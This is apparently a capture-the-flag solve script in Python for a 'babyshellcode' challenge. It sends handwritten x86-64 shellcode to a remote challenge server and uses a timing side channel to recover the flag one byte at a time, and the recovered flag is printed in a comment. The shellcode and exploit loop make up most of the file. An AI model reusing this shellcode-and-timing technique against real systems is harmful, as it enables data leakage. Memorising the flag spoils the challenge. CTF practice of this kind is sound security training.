from pwn import *
import string
import datetime


'''
# solve.S
.intel_syntax noprefix
.text
    .global _start

_start:
    mov rax, 0xcafe000
    mov rbx, 0xcafe028
    mov rcx, [rbx]
    xor [rax], rcx
    xor [rax + 0x8],  rcx
    xor [rax + 0x10], rcx
    xor [rax + 0x18], rcx
    xor [rax + 0x20], rcx
    xor [rax + 0x28], rcx
    mov rcx, [rax + {index}]
    mov rdx, {guess}
    and rcx, 0xff
    and rdx, 0xff
loop:
    cmp rdx, rcx
    je loop
'''


shellcode_template = b'\x48\xc7\xc0\x00\xe0\xaf\x0c\x48\xc7\xc3\x28\xe0\xaf\x0c\x48\x8b\x0b\x48\x31\x08\x48\x31\x48\x08\x48\x31\x48\x10\x48\x31\x48\x18\x48\x31\x48\x20\x48\x31\x48\x28\x48\x8b\x48{index}\x48\xc7\xc2{guess}\x00\x00\x00\x48\x81\xe1\xff\x00\x00\x00\x48\x81\xe2\xff\x00\x00\x00\x48\x39\xca\x74\xfb'


BINPATH = './babyshellcode'
def guess_byte(index):
    candidates = string.printable[:-6]
    for ch in candidates:
        index_b = struct.pack('b', index)
        guess_b = struct.pack('b', ord(ch))
        shellcode = shellcode_template.format(index=index_b, guess=guess_b)

        # io = process(BINPATH)
        io = remote('209.97.162.170', 2222)
        start = datetime.datetime.now()
        try:
            io.send(shellcode.ljust(0x46, b'\x90'))
            io.readline()
        except Exception:
            io.close()
        end = datetime.datetime.now()
        delta = (end - start).total_seconds()
        if delta > 2:
            return ch


def solve():
    context.binary = BINPATH
    context.log_level = "error"
    flag = ''
    for i in xrange(0xff):
        guessed = guess_byte(i)
        flag += guessed
        print(flag)
        if guessed == '}':
            break

# ISITDTU{y0ur_sh3llc0d3_Sk!LL_s0_g00000d}


if __name__ == '__main__':
    solve()
